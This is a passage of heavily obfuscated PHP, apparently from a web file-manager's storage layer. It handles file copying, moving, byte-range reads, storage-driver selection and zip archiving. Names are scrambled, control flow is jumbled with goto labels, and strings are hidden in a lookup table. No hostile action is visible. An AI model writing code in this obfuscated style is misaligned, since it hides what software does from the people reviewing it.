trim($E—‹¼ïÓÆÒ, $BŒ¦²Êó×[8]) == trim($c«’¨ÍÖÔì->pathFather($D¤å’ˆ ÷Æ), $BŒ¦²Êó×[8])) { if ($E³©¬¾ù‘->pathThis($D¤å’ˆ ÷Æ) != $F…¥ªÌø­Ë && !$E³©¬¾ù‘->isTypeObject()) { return $E³©¬¾ù‘->rename($D¤å’ˆ ÷Æ, $F…¥ªÌø­Ë); } return $c«’¨ÍÖÔì->getPathOuter($D¤å’ˆ ÷Æ); } if (method_exists($c«’¨ÍÖÔì, $F¦ƒ°ˆ‡”Õ)) { return $c«’¨ÍÖÔì->{$F¦ƒ°ˆ‡”Õ}($D¤å’ˆ ÷Æ, $E—‹¼ïÓÆÒ, $aïæ³¸ÁÄ); } } goto D†ùŠèÏ†·; B–‚ÊØÑøá: if ($dÔ«ï¤Œæ») { $F¾£ÔÓø…ˆ = $dÔ«ï¤Œæ»->getPathOuter($F¾£ÔÓø…ˆ); } return $F¾£ÔÓø…ˆ; goto A‘ƒí™‚ÃÙ; A‘ƒí™‚ÃÙ: } private static function check($c¢”¼ÂñŠğ, $dšæ« ¶ãç, $a³ƒÕÑœîš, &$cÚáÛœëç®) { $Dê›Õ‚î =& $_SERVER[µ…]; if (self::driverIsSame($c¢”¼ÂñŠğ, $a³ƒÕÑœîš) && $c¢”¼ÂñŠğ->isFolder($dšæ« ¶ãç) && $c¢”¼ÂñŠğ->isParentOf($dšæ« ¶ãç, $cÚáÛœëç®)) { show_json(LNG($Dê›Õ‚î[1027]), !1); } if (!$c¢”¼ÂñŠğ->exist($dšæ« ¶ãç)) { show_json(LNG($Dê›Õ‚î[104]), !1); } } private static function copyPath($b”åÍ÷Íòà, $EíõÎ±˜™, $D¶ÔŒ®…, $A²È£Å‡Ø, $a”œÛæâø, $D†Â‰„Œâ, $F ’³‰°¨„, $ağº‰‚Â§ = false) { goto EïÚÄÅù¹£; FÙµ´Ã«ğƒ: if ($F ’³‰°¨„) { return self::copyFile($b”åÍ÷Íòà, $EíõÎ±˜™, $D¶ÔŒ®…, $A²È£Å‡Ø, $côÄ¯¸ƒ«, $D†Â‰„Œâ); } if ($a”œÛæâø == REPEAT_RENAME_FOLDER) { $a”œÛæâø = !1; } $c–æê‹Ü÷ = rtrim($A²È£Å‡Ø, $F‹êƒ´œ¢á[8]) . $F‹êƒ´œ¢á[8] . $côÄ¯¸ƒ«; goto c·ÓÔ«á°—; A³‘†ˆ™: $Cä´Ÿ¡…Û = array_merge($DèÑ¬ä…Ñ[$F‹êƒ´œ¢á[73]], $DèÑ¬ä…Ñ[$F‹êƒ´œ¢á[74]]); foreach ($Cä´Ÿ¡…Û as $f™ÎØåùÊ‚) { $C‹§­¢ĞôÀ = $f™ÎØåùÊ‚[$F‹êƒ´œ¢á[29]] == $F‹êƒ´œ¢á[191]; $EíõÎ±˜™ = $b”åÍ÷Íòà->getPathInner($f™ÎØåùÊ‚[$F‹êƒ´œ¢á[75]]); $Aœï­ôò–Û = self::copyPath($b”åÍ÷Íòà, $EíõÎ±˜™, $D¶ÔŒ®…, $A²È£Å‡Ø, $a”œÛæâø, $D†Â‰„Œâ, $C‹§­¢ĞôÀ); if (!$Aœï­ôò–Û) { IO::errorTips($F‹êƒ´œ¢á[1028] . $EíõÎ±˜™ . $F‹êƒ´œ¢á[66] . $A²È£Å‡Ø); } } return $dæä†•Ù¢; goto CêÄÂ±øÍ¦; c·ÓÔ«á°—: $dæä†•Ù¢ = $D¶ÔŒ®…->mkdir($D¶ÔŒ®…->getPath($c–æê‹Ü÷)); $A²È£Å‡Ø = $D¶ÔŒ®…->getPathInner($dæä†•Ù¢); $DèÑ¬ä…Ñ = $b”åÍ÷Íòà->listPath($EíõÎ±˜™, !0); goto A³‘†ˆ™; EïÚÄÅù¹£: $F‹êƒ´œ¢á =& $_SERVER[µ…]; $côÄ¯¸ƒ« = $ağº‰‚Â§ ? $ağº‰‚Â§ : $b”åÍ÷Íòà->pathThis($EíõÎ±˜™); if ($a”œÛæâø) { $C¼Â¿™³‘© = $D¶ÔŒ®…->fileNameExist($A²È£Å‡Ø, $côÄ¯¸ƒ«); $côÄ¯¸ƒ« = $D¶ÔŒ®…->fileNameAuto($A²È£Å‡Ø, $côÄ¯¸ƒ«, $a”œÛæâø, !$F ’³‰°¨„); $a”œÛæâø = $C¼Â¿™³‘© ? $a”œÛæâø : !1; } goto FÙµ´Ã«ğƒ; CêÄÂ±øÍ¦: } private static function copyFile($a¨æË¯ïª, $bŸµíâë, $F‰—ô•­“ğ, $cÓùƒªàÇâ, $AºÛ£Ó‘«‹, $a²¼°·âÁ˜) { goto dÙŠŞ™Çà‚; e©ğ‹¨±·ƒ: $AïÙÅ‚–Ì× = $a¨æË¯ïª->iconvApp($AïÙÅ‚–Ì×); $dæ³Ø©Êì‰ = $F‰—ô•­“ğ->upload($cÓùƒªàÇâ, $AïÙÅ‚–Ì×, $a²¼°·âÁ˜); self::remove($E‘ÎŠ¯é«¸ . $C¿Ğ‚ô†¾); goto C‹§—‘ìæí; BëæÅ„ºñí: Hook::trigger($aåÏöõŠŒ[1030], $a¨æË¯ïª, $bŸµíâë, $F‰—ô•­“ğ, $cÓùƒªàÇâ, $AºÛ£Ó‘«‹, $C¿Ğ‚ô†¾); if (self::driverIsSame($a¨æË¯ïª, $F‰—ô•­“ğ)) { if ($a²¼°·âÁ˜) { $dæ³Ø©Êì‰ = $F‰—ô•­“ğ->moveFile($bŸµíâë, $cÓùƒªàÇâ); } else { $dæ³Ø©Êì‰ = $F‰—ô•­“ğ->copyFile($bŸµíâë, $cÓùƒªàÇâ); } Hook::trigger($aåÏöõŠŒ[1031], $a¨æË¯ïª, $bŸµíâë, $F‰—ô•­“ğ, $cÓùƒªàÇâ, $AºÛ£Ó‘«‹, $dæ³Ø©Êì‰); return $dæ³Ø©Êì‰; } $E‘ÎŠ¯é«¸ = TEMP_FILES; goto bªÜ–’Îì; dÙŠŞ™Çà‚: $aåÏöõŠŒ =& $_SERVER[µ…]; $cÓùƒªàÇâ = $F‰—ô•­“ğ->getPath(rtrim($cÓùƒªàÇâ, $aåÏöõŠŒ[8]) . $aåÏöõŠŒ[8] . $AºÛ£Ó‘«‹); $C¿Ğ‚ô†¾ = $aåÏöõŠŒ[1029] . time() . rand_string(5); goto BëæÅ„ºñí; C‹§—‘ìæí: Hook::trigger($aåÏöõŠŒ[1031], $a¨æË¯ïª, $bŸµíâë, $F‰—ô•­“ğ, $cÓùƒªàÇâ, $AºÛ£Ó‘«‹, $dæ³Ø©Êì‰); return $dæ³Ø©Êì‰; goto d§‡¯»õ; bªÜ–’Îì: mk_dir($E‘ÎŠ¯é«¸); $AïÙÅ‚–Ì× = $E‘ÎŠ¯é«¸ . $C¿Ğ‚ô†¾; $AïÙÅ‚–Ì× = $a¨æË¯ïª->download($bŸµíâë, $AïÙÅ‚–Ì×); goto e©ğ‹¨±·ƒ; d§‡¯»õ: } public static function pathFather($bğáİ—áÂÕ) { $eÅ£õÄŠáÜ = IO::init($bğáİ—áÂÕ); $A·Àİ‰®Å = $eÅ£õÄŠáÜ->pathFather($eÅ£õÄŠáÜ->path); return $eÅ£õÄŠáÜ->getPathOuter($A·Àİ‰®Å); } public static function fileOut($bÏÄÃ·Ëø¼, $cº´Îº‰Îè = false, $E‹¨—¯©§Š = false, $cëœì¥¶« = '') { $dÎÃÌçÎê = self::driverMake($bÏÄÃ·Ëø¼); if ($dÎÃÌçÎê->isFileOutServer()) { return $dÎÃÌçÎê->fileOutServer($bÏÄÃ·Ëø¼, $cº´Îº‰Îè, $E‹¨—¯©§Š, $cëœì¥¶«); } return $dÎÃÌçÎê->fileOut($bÏÄÃ·Ëø¼, $cº´Îº‰Îè, $E‹¨—¯©§Š, $cëœì¥¶«); } public static function fileOutImage($FªÔÆÀ¸ ò, $f†×¡ƒÖø = 250) { $D‚—é‘íË = array(250, 600, 1200, 3000, 5000); for ($FĞŒÆùÔ²™ = 0; $FĞŒÆùÔ²™ < count($D‚—é‘íË); $FĞŒÆùÔ²™++) { if ($FĞŒÆùÔ²™ == 0 && $f†×¡ƒÖø <= $D‚—é‘íË[$FĞŒÆùÔ²™]) { $f†×¡ƒÖø = $D‚—é‘íË[$FĞŒÆùÔ²™]; break; } else { if ($f†×¡ƒÖø > $D‚—é‘íË[$FĞŒÆùÔ²™ - 1] && $f†×¡ƒÖø <= $D‚—é‘íË[$FĞŒÆùÔ²™]) { $f†×¡ƒÖø = $D‚—é‘íË[$FĞŒÆùÔ²™]; break; } else { if ($FĞŒÆùÔ²™ == count($D‚—é‘íË) - 1 && $f†×¡ƒÖø > $D‚—é‘íË[$FĞŒÆùÔ²™]) { $f†×¡ƒÖø = $D‚—é‘íË[$FĞŒÆùÔ²™]; break; } } } } $F½¹ºÍªÚ¶ = self::driverMake($FªÔÆÀ¸ ò); if ($F½¹ºÍªÚ¶->isFileOutServer()) { return $F½¹ºÍªÚ¶->fileOutImageServer($FªÔÆÀ¸ ò, $f†×¡ƒÖø); } return $F½¹ºÍªÚ¶->fileOutImage($FªÔÆÀ¸ ò, $f†×¡ƒÖø); } private static function driverIsSame($eŠ—â¤î¥, $e±Ñ…¿äÑâ) { goto FØŸŠ˜ƒëÜ; d©«ğ¡í„: if ($f’ö‹Ùâ¬Ş != $AÃ•É·ß†) { return !1; } if ($f’ö‹Ùâ¬Ş == $døİ½ÍÙ‘›[709]) { return !0; } if ($f’ö‹Ùâ¬Ş == $døİ½ÍÙ‘›[105]) { return !0; } goto D—ğ«°À©³; D—ğ«°À©³: if ($eŠ—â¤î¥->pathDriver == $e±Ñ…¿äÑâ->pathDriver) { return !0; } return !1; goto BŠù×¯Íİ±; FØŸŠ˜ƒëÜ: $døİ½ÍÙ‘› =& $_SERVER[µ…]; $f’ö‹Ùâ¬Ş = $eŠ—â¤î¥->getType(); $AÃ•É·ß† = $e±Ñ…¿äÑâ->getType(); goto d©«ğ¡í„; BŠù×¯Íİ±: } public static function copyUpdate($Bç¿…ÑÜŒ, $a³±ë»Øù) { goto DØùàŞ®›Ü; BáóèŸÙ‹—: Hook::trigger($aÈÃ¯´å„»[1035], $Bç¿…ÑÜŒ, $a³±ë»Øù, $eîÍ­•î¶); foreach ($B‡Á‚³Ï˜ì as $cËˆÍ˜Ä­·) { IO::mkdir($cËˆÍ˜Ä­·); } foreach ($E«³è™š§Æ as $cËˆÍ˜Ä­·) { IO::copy($cËˆÍ˜Ä­·[$aÈÃ¯´å„»[1032]], $cËˆÍ˜Ä­·[$aÈÃ¯´å„»[1033]], REPEAT_REPLACE); } goto B¦”ÜÓàİ§; DØùàŞ®›Ü: $aÈÃ¯´å„» =& $_SERVER[µ…]; if (!IO::exist($Bç¿…ÑÜŒ)) { return !1; } if (!IO::exist($a³±ë»Øù)) { IO::mkdir($a³±ë»Øù); } goto fâå—³ßé²; fâå—³ßé²: $c¦òœ‹›½Ì = self::_listAll($Bç¿…ÑÜŒ); $dôèË˜Ÿ×’ = self::_listAll($a³±ë»Øù); $E«³è™š§Æ = array(); goto fµ¶·„¹›; fµ¶·„¹›: $B‡Á‚³Ï˜ì = array(); foreach ($c¦òœ‹›½Ì as $BäâùŞ…²Á => $cËˆÍ˜Ä­·) { if (isset($dôèË˜Ÿ×’[$BäâùŞ…²Á])) { if ($cËˆÍ˜Ä­·[$aÈÃ¯´å„»[76]] == 1) { continue; } if ($dôèË˜Ÿ×’[$BäâùŞ…²Á][$aÈÃ¯´å„»[77]] == $cËˆÍ˜Ä­·[$aÈÃ¯´å„»[77]]) { continue; } } if ($cËˆÍ˜Ä­·[$aÈÃ¯´å„»[76]] == 1) { $B‡Á‚³Ï˜ì[] = $a³±ë»Øù . $aÈÃ¯´å„»[8] . $BäâùŞ…²Á; continue; } $A‰µ„İÕ¢ = strstr(trim($BäâùŞ…²Á, $aÈÃ¯´å„»[8]), $aÈÃ¯´å„»[8]) ? get_path_father($BäâùŞ…²Á) : $aÈÃ¯´å„»[33]; $E«³è™š§Æ[] = array($aÈÃ¯´å„»[1032] => $cËˆÍ˜Ä­·[$aÈÃ¯´å„»[75]], $aÈÃ¯´å„»[1033] => rtrim($a³±ë»Øù, $aÈÃ¯´å„»[8]) . $aÈÃ¯´å„»[8] . $A‰µ„İÕ¢, $aÈÃ¯´å„»[1034] => $cËˆÍ˜Ä­·); } $eîÍ­•î¶ = array($aÈÃ¯´å„»[191] => $E«³è™š§Æ, $aÈÃ¯´å„»[76] => $B‡Á‚³Ï˜ì); goto BáóèŸÙ‹—; B¦”ÜÓàİ§: } private static function _listAll($b²Î¯ˆ±À) { $cÅ¾¹é¤Š‘ =& $_SERVER[µ…]; $b²Î¯ˆ±À = KodIO::clear($b²Î¯ˆ±À); $eÎæ‚Íé§¯ = IO::listAll($b²Î¯ˆ±À); foreach ($eÎæ‚Íé§¯ as &$D§Íó¥Ê¾‡) { $Cğ§¸æÓÚ° = substr($D§Íó¥Ê¾‡[$cÅ¾¹é¤Š‘[75]], strlen($b²Î¯ˆ±À)); $D§Íó¥Ê¾‡[$cÅ¾¹é¤Š‘[1036]] = trim($Cğ§¸æÓÚ°, $cÅ¾¹é¤Š‘[8]); } unset($D§Íó¥Ê¾‡); return array_to_keyvalue($eÎæ‚Íé§¯, $cÅ¾¹é¤Š‘[1036]); } public static function fileSubstr($DÊ›»¤ğÁ³, $E»ºˆˆ×é«, $F™Å³İÍÜ = false) { goto c’Æã²Èİ; c’Æã²Èİ: $Aéººì‡Á¡ =& $_SERVER[µ…]; $b†£Êˆƒª = self::driverMake($DÊ›»¤ğÁ³); $AÚ¤­››ÆÖ = $b†£Êˆƒª->size($DÊ›»¤ğÁ³); goto dáí©•›™Û; FïÅ¯ˆ­±à: if (!$c”ÒÅµ¹Èˆ && $F™Å³İÍÜ && isset($GLOBALS[$Aéººì‡Á¡[1039]])) { throw new Exception($GLOBALS[$Aéººì‡Á¡[1039]][$Aéººì‡Á¡[1040]]); } return $c”ÒÅµ¹Èˆ; goto Cß²µìŒÕë; dáí©•›™Û: $B¸¹æÍµ‹ = $E»ºˆˆ×é«; $B•ğ‹Ğßë— = $F™Å³İÍÜ; if ($E»ºˆˆ×é« < 0) { $E»ºˆˆ×é« = $AÚ¤­››ÆÖ + $E»ºˆˆ×é«; } goto Bô¹à¤è˜; F‹‘‚‘ë‰İ: if ($F™Å³İÍÜ <= 0) { return $Aéººì‡Á¡[33]; } if ($E»ºˆˆ×é« < 0 || $E»ºˆˆ×é« >= $AÚ¤­››ÆÖ || $F™Å³İÍÜ > 1024 * 1024 * 5) { throw new Exception("\146\x69\x6c\x65\122\145\141\144\40\145\x72\x72\x6f\x72\x21\x20\x73\164\141\162\x74\75{$E»ºˆˆ×é«}\x3b\154\145\x6e\147\164\x68\75{$F™Å³İÍÜ}\x3b\x20\163\151\x7a\x65\x3d{$AÚ¤­››ÆÖ}\73"); } $c”ÒÅµ¹Èˆ = $b†£Êˆƒª->fileSubstr($DÊ›»¤ğÁ³, $E»ºˆˆ×é«, $F™Å³İÍÜ); goto FïÅ¯ˆ­±à; Bô¹à¤è˜: if ($F™Å³İÍÜ === !1) { $F™Å³İÍÜ = $AÚ¤­››ÆÖ - $E»ºˆˆ×é«; } if ($E»ºˆˆ×é« + $F™Å³İÍÜ > $AÚ¤­››ÆÖ) { $F™Å³İÍÜ = $AÚ¤­››ÆÖ - $E»ºˆˆ×é«; } if (!$AÚ¤­››ÆÖ && $b†£Êˆƒª->getType() == $Aéººì‡Á¡[105] && !$b†£Êˆƒª->exist($DÊ›»¤ğÁ³)) { throw new Exception($Aéººì‡Á¡[1037] . LNG($Aéººì‡Á¡[1038]) . $Aéººì‡Á¡[902] . get_path_this($DÊ›»¤ğÁ³) . $Aéººì‡Á¡[33]); } goto F‹‘‚‘ë‰İ; Cß²µìŒÕë: } private static function driverMake(&$Dâ¨§Ààé) { goto DğïµĞì¹; c¥ºÑ…ë˜‚: return $e‡‰Êîµ; goto aŠôºô«; C¿÷ƒëÙââ: if ($A­¨…º°¦[$bĞæõİÓ¹Ô[29]] == KodIO::KOD_IO && !self::$driverListSystem[$A­¨…º°¦[$bĞæõİÓ¹Ô[388]]]) { return !1; } $Dâ¨§Ààé = $A­¨…º°¦[$bĞæõİÓ¹Ô[1041]]; $e‡‰Êîµ = self::driverGet($A­¨…º°¦, $Dâ¨§Ààé); goto c¥ºÑ…ë˜‚; DğïµĞì¹: $bĞæõİÓ¹Ô =& $_SERVER[µ…]; $A­¨…º°¦ = KodIO::parse($Dâ¨§Ààé); if (!self::$driverListSystem) { $E“Ì°¦³Û‹ = Model($bĞæõİÓ¹Ô[718])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($E“Ì°¦³Û‹, $bĞæõİÓ¹Ô[388]); } goto C¿÷ƒëÙââ; aŠôºô«: } private static function driverGet($A‰„ì£˜è, &$FïÓ½ê²®) { goto F…èòÛ²×Ô; AºŠº˜¶Èˆ: $D‰¥³·ÁŠò = self::$driverCache[$d¿È•´®ÏŠ]; $D‰¥³·ÁŠò->pathDriver = $d¯¢­¯ÑÕ–; $D‰¥³·ÁŠò->pathBase = $EÃ•µØ‚Ú‰[33]; goto c™›õî¹ô; c™›õî¹ô: if (isset($bƒ„…ØÈƒ[$EÃ•µØ‚Ú‰[6]][$EÃ•µØ‚Ú‰[1053]])) { $D‰¥³·ÁŠò->pathBase = rtrim($bƒ„…ØÈƒ[$EÃ•µØ‚Ú‰[6]][$EÃ•µØ‚Ú‰[1053]], $EÃ•µØ‚Ú‰[8]) . $EÃ•µØ‚Ú‰[8]; $FïÓ½ê²® = $D‰¥³·ÁŠò->pathBase . ltrim($FïÓ½ê²®, $EÃ•µØ‚Ú‰[8]); } $FïÓ½ê²® = $D‰¥³·ÁŠò->getPath($FïÓ½ê²®); if (isset($A‰„ì£˜è[$EÃ•µØ‚Ú‰[1025]])) { $FïÓ½ê²® = $A‰„ì£˜è[$EÃ•µØ‚Ú‰[1025]]; } goto e³›¯¹Ï›©; E†éÓœŒÀ»: switch ($A‰„ì£˜è[$EÃ•µØ‚Ú‰[29]]) { case KodIO::KOD_IO: $bƒ„…ØÈƒ = self::$driverListSystem[$F”ÔÕŒÍÁ‡]; break; case KodIO::KOD_SOURCE: $FïÓ½ê²® = $F”ÔÕŒÍÁ‡ . $FïÓ½ê²®; $bƒ„…ØÈƒ = array($EÃ•µØ‚Ú‰[1043] => $EÃ•µØ‚Ú‰[1044], $EÃ•µØ‚Ú‰[6] => $A‰„ì£˜è); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $c°Œãñ¯£ = $GLOBALS[$EÃ•µØ‚Ú‰[1045]]; self::$driverListUser = array_to_keyvalue($c°Œãñ¯£, $EÃ•µØ‚Ú‰[388]); } $bƒ„…ØÈƒ = self::$driverListUser[$F”ÔÕŒÍÁ‡]; break; case KodIO::KOD_SHARE_LINK: $bƒ„…ØÈƒ = array($EÃ•µØ‚Ú‰[1043] => $EÃ•µØ‚Ú‰[1046], $EÃ•µØ‚Ú‰[6] => $A‰„ì£˜è); $Bİã©™òÆØ = Action($EÃ•µØ‚Ú‰[1047])->sharePathInfo($A‰„ì£˜è[$EÃ•µØ‚Ú‰[75]]); $FïÓ½ê²® = $Bİã©™òÆØ[$EÃ•µØ‚Ú‰[390]]; if (!$Bİã©™òÆØ[$EÃ•µØ‚Ú‰[390]]) { $bší±³Šš = Model($EÃ•µØ‚Ú‰[558])->getInfo($Bİã©™òÆØ[$EÃ•µØ‚Ú‰[462]]); $FïÓ½ê²® = KodIO::clear($bší±³Šš[$EÃ•µØ‚Ú‰[1048]] . $A‰„ì£˜è[$EÃ•µØ‚Ú‰[1041]]); $A‰„ì£˜è[$EÃ•µØ‚Ú‰[460]] = $bší±³Šš; $A‰„ì£˜è[$EÃ•µØ‚Ú‰[1025]] = $FïÓ½ê²®; $bƒ„…ØÈƒ = array($EÃ•µØ‚Ú‰[1043] => $EÃ•µØ‚Ú‰[1049], $EÃ•µØ‚Ú‰[6] => $A‰„ì£˜è); } break; case KodIO::KOD_SHARE_ITEM: $bƒ„…ØÈƒ = array($EÃ•µØ‚Ú‰[1043] => $EÃ•µØ‚Ú‰[1050], $EÃ•µØ‚Ú‰[6] => $A‰„ì£˜è); $bší±³Šš = Model($EÃ•µØ‚Ú‰[558])->getInfo($A‰„ì£˜è[$EÃ•µØ‚Ú‰[388]]); if ($bší±³Šš[$EÃ•µØ‚Ú‰[390]] == $EÃ•µØ‚Ú‰[491]) { $FïÓ½ê²® = KodIO::clear($bší±³Šš[$EÃ•µØ‚Ú‰[1048]] . $A‰„ì£˜è[$EÃ•µØ‚Ú‰[1041]]); $A‰„ì£˜è[$EÃ•µØ‚Ú‰[460]] = $bší±³Šš; $A‰„ì£˜è[$EÃ•µØ‚Ú‰[1025]] = $FïÓ½ê²®; $bƒ„…ØÈƒ = array($EÃ•µØ‚Ú‰[1043] => $EÃ•µØ‚Ú‰[1051], $EÃ•µØ‚Ú‰[6] => $A‰„ì£˜è); } else { if (!$FïÓ½ê²®) { $FïÓ½ê²® = $bší±³Šš[$EÃ•µØ‚Ú‰[390]]; } } break; default: $FïÓ½ê²® = $A‰„ì£˜è[$EÃ•µØ‚Ú‰[75]]; $bƒ„…ØÈƒ = array($EÃ•µØ‚Ú‰[1043] => $EÃ•µØ‚Ú‰[1052]); break; } $d¿È•´®ÏŠ = $A‰„ì£˜è[$EÃ•µØ‚Ú‰[75]]; if (!isset(self::$driverCache[$d¿È•´®ÏŠ])) { $DšÓ©ŒæÒ› = strtolower($bƒ„…ØÈƒ[$EÃ•µØ‚Ú‰[93]]); $bé¢£ƒ«ÍÉ = $GLOBALS[$EÃ•µØ‚Ú‰[6]][$EÃ•µØ‚Ú‰[87]][$EÃ•µØ‚Ú‰[770]]; $f“¦éŠÚÙÓ = $EÃ•µØ‚Ú‰[71] . (isset($bé¢£ƒ«ÍÉ[$DšÓ©ŒæÒ›]) ? $bé¢£ƒ«ÍÉ[$DšÓ©ŒæÒ›] : ucfirst($DšÓ©ŒæÒ›)); if (!class_exists($f“¦éŠÚÙÓ)) { show_json("{$f“¦éŠÚÙÓ}\40\156\157\164\40\145\170\x69\x73\164\163\41", !1); } $d•¬Ü–®°‚ = isset($bƒ„…ØÈƒ[$EÃ•µØ‚Ú‰[6]]) ? $bƒ„…ØÈƒ[$EÃ•µØ‚Ú‰[6]] : !1; self::$driverCache[$d¿È•´®ÏŠ] = new $f“¦éŠÚÙÓ($d•¬Ü–®°‚); } goto AºŠº˜¶Èˆ; F…èòÛ²×Ô: $EÃ•µØ‚Ú‰ =& $_SERVER[µ…]; $d¯¢­¯ÑÕ– = $A‰„ì£˜è[$EÃ•µØ‚Ú‰[1042]]; $F”ÔÕŒÍÁ‡ = $A‰„ì£˜è[$EÃ•µØ‚Ú‰[388]]; goto E†éÓœŒÀ»; e³›¯¹Ï›©: $D‰¥³·ÁŠò->path = $FïÓ½ê²®; return $D‰¥³·ÁŠò; goto eğÀÒßßàí; eğÀÒßßàí: } public static function errorTips($B´Š´™ğÎ÷ = false) { goto Fš•É–ÀŒ; A»ù¸ÏÕåË: if ($B´Š´™ğÎ÷ === -1) { return $c¾†ò¾°È ? $c¾†ò¾°È[count($c¾†ò¾°È) - 1] : $A­Ôœò˜¶ò[33]; } if ($B´Š´™ğÎ÷ === !1) { return implode($A­Ôœò˜¶ò[227], $c¾†ò¾°È); } if (count($c¾†ò¾°È) >= $aÉøÇ¡Ö½ğ) { $c¾†ò¾°È = array_slice($c¾†ò¾°È, $aÉøÇ¡Ö½ğ * 0.5, $aÉøÇ¡Ö½ğ); } goto AÈŸ¯ËàÀ; AÈŸ¯ËàÀ: $c¾†ò¾°È[] = $B´Š´™ğÎ÷; write_log($A­Ôœò˜¶ò[159] . ACTION . $A­Ôœò˜¶ò[1054] . $B´Š´™ğÎ÷, $A­Ôœò˜¶ò[1055]); goto Fˆõ°éæÅœ; Fš•É–ÀŒ: $A­Ôœò˜¶ò =& $_SERVER[µ…]; static $c¾†ò¾°È = array(); $aÉøÇ¡Ö½ğ = 1000; goto A»ù¸ÏÕåË; Fˆõ°éæÅœ: } public static function getLastError($B¶–Š¤¯Æ = '') { $C»£æ‰¦À… = self::errorTips(-1); return $C»£æ‰¦À… ? $C»£æ‰¦À… : $B¶–Š¤¯Æ; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $FÉÁôØ“É†; if (!$FÉÁôØ“É†) { $dİ¹Ñ¸¬Ë = IO::init($_SERVER[µ…][8]); } return $dİ¹Ñ¸¬Ë; } private static function iconvSystem($e®œ“Ş£®) { return self::local()->iconvSystem($e®œ“Ş£®); } private static function iconvApp($D¦æØ±ìÈº) { return self::local()->iconvApp($D¦æØ±ìÈº); } public static function zip($eÊ§Á·ÅåŒ, $AôÛë©²Š = "\x7a\151\160", $AíÑ¶ÍÙ½Ü = '', $EÇÄ½Ö‘ô = REPEAT_RENAME) { goto A²öõÆ´¸; AÓ÷ƒ÷¾•–: if (!$c™¡¿Ÿá„à) { del_dir($Dèæ‡ÂÒÇ); show_json(LNG($d¢­ ‚Ü—[1058]), !1); } del_dir($Dèæ‡ÂÒÇ); return $c™¡¿Ÿá„à; goto d‰ÔºÆÇ‹; aáä “è¥: $Dèæ‡ÂÒÇ = !1; if (!$AíÑ¶ÍÙ½Ü && $bÄ½‚øòÍŸ->getType() == $d¢­ ‚Ü—[105]) { $cŸÏÌ¶í»š = self::zipFileList($eÊ§Á·ÅåŒ); } else { $Dèæ‡ÂÒÇ = $AíÑ¶ÍÙ½Ü ? $AíÑ¶ÍÙ½Ü : TEMP_FILES . $d¢­ ‚Ü—[1056] . time() . rand_string(8) . $d¢­ ‚Ü—[8]; mk_dir($Dèæ‡ÂÒÇ); $cŸÏÌ¶í»š = self::zipFileList($eÊ§Á·ÅåŒ, $Dèæ‡ÂÒÇ); } $bÇÓ°‘…‡Ó = $aæçøôÛ”Ş[$d¢­ ‚Ü—[28]]; goto a§¦Ù›ææ„; EÈÚÔÖ»òÆ: foreach ($cŸÏÌ¶í»š as $CÓëœë„ÙÌ => $fË°„ƒÀ‚ù) { $cŸÏÌ¶í»š[$CÓëœë„ÙÌ] = self::iconvSystem($fË°„ƒÀ‚ù); } KodArchive::create($FŠ¿ ÚŞë, $cŸÏÌ¶í»š); if (!IO::exist($döÜÃ¬È©Ü)) { if ($Dèæ‡ÂÒÇ) { del_dir($Dèæ‡ÂÒÇ); } show_json(LNG($d¢­ ‚Ü—[1058]), !1); } goto BÊáÄ‘â; BÊáÄ‘â: if ($AíÑ¶ÍÙ½Ü || !$Dèæ‡ÂÒÇ) { if ($Dèæ‡ÂÒÇ && strstr($Dèæ‡ÂÒÇ, TEMP_FILES)) { $B»ø˜»÷êÁ = $cŸÏÌ¶í»š = array(); recursion_dir($B‰È÷–Ñ, $B»ø˜»÷êÁ, $cŸÏÌ¶í»š, 0); foreach ($B»ø˜»÷êÁ as $EÁæ šÕœ„) { del_dir($EÁæ šÕœ„); } foreach ($cŸÏÌ¶í»š as $bÄÔ¬šª) { if ($bÄÔ¬šª == $FŠ¿ ÚŞë) { continue; } del_file($bÄÔ¬šª); } } return $döÜÃ¬È©Ü; } $FÌ”²ñ†‹ƒ = self::pathFather($aæçøôÛ”Ş[$d¢­ ‚Ü—[75]]); $c™¡¿Ÿá„à = self::move($döÜÃ¬È©Ü, $FÌ”²ñ†‹ƒ, $EÇÄ½Ö‘ô); goto AÓ÷ƒ÷¾•–; A²öõÆ´¸: $d¢­ ‚Ü— =& $_SERVER[µ…]; $bÄ½‚øòÍŸ = self::init($eÊ§Á·ÅåŒ[0][$d¢­ ‚Ü—[75]]); $aæçøôÛ”Ş = self::info($eÊ§Á·ÅåŒ[0][$d¢­ ‚Ü—[75]]); goto aáä “è¥; a§¦Ù›ææ„: if (count($cŸÏÌ¶í»š) > 1) { $FÑ¼µªˆÂÕ = IO::info(IO::pathFather($aæçøôÛ”Ş[$d¢­ ‚Ü—[75]])); $bÇÓ°‘…‡Ó = $FÑ¼µªˆÂÕ[$d¢­ ‚Ü—[28]]; } $B‰È÷–Ñ = $Dèæ‡ÂÒÇ; if (!$B‰È÷–Ñ) { $B‰È÷–Ñ = get_path_father($aæçøôÛ”Ş[$d¢­ ‚Ü—[75]]); if (!$AíÑ¶ÍÙ½Ü && $bÄ½‚øòÍŸ->getType() == $d¢­ ‚Ü—[105]) { $B‰È÷–Ñ = get_path_father($bÄ½‚øòÍŸ->path); } $DîÉ»Ë©ÔË = IO::info($B‰È÷–Ñ); if (!$DîÉ»Ë©ÔË[$d¢­ ‚Ü—[194]]) { show_json(LNG($d¢­ ‚Ü—[1057]), !1); } } goto dê·ÙíÜÑØ; dê·ÙíÜÑØ: $döÜÃ¬È©Ü = $B‰È÷–Ñ . $bÇÓ°‘…‡Ó . $d¢­ ‚Ü—[94] . $AôÛë©²Š; $döÜÃ¬È©Ü = get_filename_auto($döÜÃ¬È©Ü, $d¢­ ‚Ü—[33], $EÇÄ½Ö‘ô); $FŠ¿ ÚŞë = self::iconvSystem($döÜÃ¬È©Ü); goto EÈÚÔÖ»òÆ; d‰ÔºÆÇ‹: } public static function unzip($eƒ…½‚ñ±, $CÇé‹î—…¸ = "\162\x65\160\154\141\143\x65") { goto D·º¢Ï¶‚; F¶ïå“ŒÁ: return !0; goto dÒ»˜ª›İË; c™šŸ”…Ëœ: $F´›µ¸–‘š = KodArchive::extract($C×¤Ä†…³¸, $B±‚ù™ƒ¨‹ . $Fƒê‹¾ïËÛ[8], $A—›±ÄÒåµ); self::archiveExt(); if (!$F´›µ¸–‘š[$Fƒê‹¾ïËÛ[1063]]) { show_json($Fƒê‹¾ïËÛ[1064] . 